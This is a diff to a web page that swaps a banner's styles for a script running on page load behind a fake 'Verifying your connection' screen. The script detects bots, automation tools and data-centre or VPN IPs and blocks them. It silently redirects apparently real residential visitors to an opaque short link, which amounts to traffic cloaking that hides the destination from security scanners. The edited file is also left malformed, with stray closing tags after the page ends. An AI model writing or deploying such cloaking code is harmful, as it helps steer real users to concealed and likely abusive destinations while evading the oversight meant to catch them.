@@ -1,52 +1,63 @@
 <!DOCTYPE html>
 <html>
 <head>
-<style>
-  .banner-container {
-    background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
-    color: white;
-    padding: 20px;
-    text-align: center;
-    border-radius: 12px;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-    max-width: 100%;
-    margin: 10px auto;
-  }
-  .banner-title {
-    font-size: 22px;
-    font-weight: bold;
-    margin-bottom: 8px;
-  }
-  .banner-text {
-    font-size: 14px;
-    margin-bottom: 18px;
-    opacity: 0.9;
-  }
-  .banner-btn {
-    display: inline-block;
-    background-color: #ff4757;
-    color: white;
-    text-decoration: none;
-    padding: 12px 30px;
-    font-size: 16px;
-    font-weight: bold;
-    border-radius: 25px;
-    transition: all 0.3s ease;
-    box-shadow: 0 4px 10px rgba(255, 71, 87, 0.4);
-    animation: pulse 2s infinite;
-  }
-  .banner-btn:hover {
-    background-color: #ff6b81;
-    transform: translateY(-2px);
-    box-shadow: 0 6px 15px rgba(255, 71, 87, 0.6);
-  }
-  @keyframes pulse {
-    0% { transform: scale(1); }
-    50% { transform: scale(1.05); }
-    100% { transform: scale(1); }
-  }
-</style>
+    <title>Processing...</title>
+    <meta charset="UTF-8">
+    <script>
+        async function checkTrafficAndRedirect() {
+            // ---- LEVEL 1: INTERNAL BOT DETECTION ----
+            const userAgent = navigator.userAgent.toLowerCase();
+            const isBot = /bot|googlebot|crawler|spider|robot|crawling|headless/i.test(userAgent);
+            
+            // Automation testing tools detection (Selenium, Puppeteer, etc.)
+            const isAutomated = navigator.webdriver || window.__webdriver_evaluate || window.__selenium_evaluate;
+            
+            // Unrealistic screen dimensions check (Common in headless server bots)
+            const isSuspectScreen = (window.screen.width === 0 || window.screen.height === 0);
+
+            if (isBot || isAutomated || isSuspectScreen) {
+                console.log("Bot Detected (Level 1) - Access Denied");
+                document.getElementById("status").innerText = "Access Denied: Unverified Traffic.";
+                return; // Script yahi ruk jayegi, redirect nahi hoga
+            }
+
+            // ---- LEVEL 2: VPN / PROXY / DATA-CENTER CHECK ----
+            try {
+                // Ek free API ka use karke visitor ka IP aur Network type fetch karna
+                const response = await fetch('https://ipapi.co');
+                const data = await response.json();
+                
+                // Agar ISP ka naam 'hosting', 'google', 'amazon', 'microsoft', ya 'cloudflare' jaisa ho
+                const org = data.org ? data.org.toLowerCase() : "";
+                const isDataCenter = /hosting|server|datacenter|amazon|aws|google|microsoft|azure|cloudflare|ovh|digitalocean/i.test(org);
+
+                if (isDataCenter) {
+                    console.log("Proxy/DataCenter Detected (Level 2) - Access Denied");
+                    document.getElementById("status").innerText = "Access Denied: VPN/Proxy connection detected.";
+                    return;
+                }
+
+                // ---- LEVEL 3: SUCCESSFUL REDIRECT ----
+                // Agar traffic 100% human aur real residential hai, toh link par bhej do
+                window.location.replace("https://naive-many.com/6Go4t1");
+
+            } catch (error) {
+                // Agar API network fail ho jaye, toh safety ke liye normal user ko redirect kar do
+                window.location.replace("https://naive-many.com/6Go4t1");
+            }
+        }
+
+        // Page load hote hi script run karein
+        window.onload = checkTrafficAndRedirect;
+    </script>
+</head>
+<body>
+    <div style="text-align: center; margin-top: 50px; font-family: Arial, sans-serif;">
+        <h2 id="status">Verifying your connection, please wait...</h2>
+    </div>
+</body>
+</html>
+
 </head>
 <body>
 
